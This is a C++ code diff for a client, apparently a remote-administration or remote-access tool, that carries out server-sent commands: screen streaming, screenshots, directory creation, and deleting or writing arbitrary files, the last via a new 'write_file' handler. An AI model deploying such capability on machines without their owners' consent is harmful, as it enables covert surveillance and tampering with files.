@@ -87,12 +87,13 @@ namespace silence
         using namespace std::placeholders;
         auto commandObject = data->get_map();
         std::string event = commandObject["event"]->get_string();
+        std::cout << event << std::endl;
 
         if (event == "greet")
             launchEvent<void()>(std::bind(&Client::greetEvent, this));
-        else if (event == "start stream")
+        else if (event == "start_stream")
             launchEvent<void()>(std::bind(&Client::startStreamEvent, this));
-        else if (event == "kill stream")
+        else if (event == "kill_stream")
             launchEvent<void()>(std::bind(&Client::killStreamEvent, this));
         else if (event == "screenshot")
             launchEvent<void()>(std::bind(&Client::screenshotEvent, this));
@@ -104,9 +105,12 @@ namespace silence
         else if (event == "mkdir")
             launchEvent<void(const CommandObject &)>(
                 std::bind(&Client::mkDirEvent, this, _1), commandObject);
-        else if (event == "rmdir")
+        else if (event == "remove")
             launchEvent<void(const CommandObject &)>(
-                std::bind(&Client::removeDirEvent, this, _1), commandObject);
+                std::bind(&Client::removeEvent, this, _1), commandObject);
+        else if (event == "write_file")
+            launchEvent<void(const CommandObject &)>(
+                std::bind(&Client::writeFileEvent, this, _1), commandObject);
         else
             error(event, "Unknown event");
     }
@@ -193,11 +197,27 @@ namespace silence
                      "Successfully created directory");
     }
 
-    void Client::removeDirEvent(const CommandObject &object)
+    void Client::removeEvent(const CommandObject &object)
     {
         sendResponse(fs::remove(object.at("path")->get_string()),
                      "rmdir", "fs::remove failed",
                      "Successfully deleted directory");
+    }
+
+    void Client::writeFileEvent(const CommandObject &object)
+    {
+        fs::path path = object.at("path")->get_string();
+        auto binaryContent = object.at("content")->get_binary();
+
+        std::ofstream file(path, std::ios::binary);
+        if (!file.is_open())
+        {
+            error("write file", "file.is_open() failed");
+            return;
+        }
+
+        file.write(binaryContent->data(), binaryContent->size());
+        info("Successfully written to file");
     }
 
     void Client::error(const std::string &event, const std::string &msg)
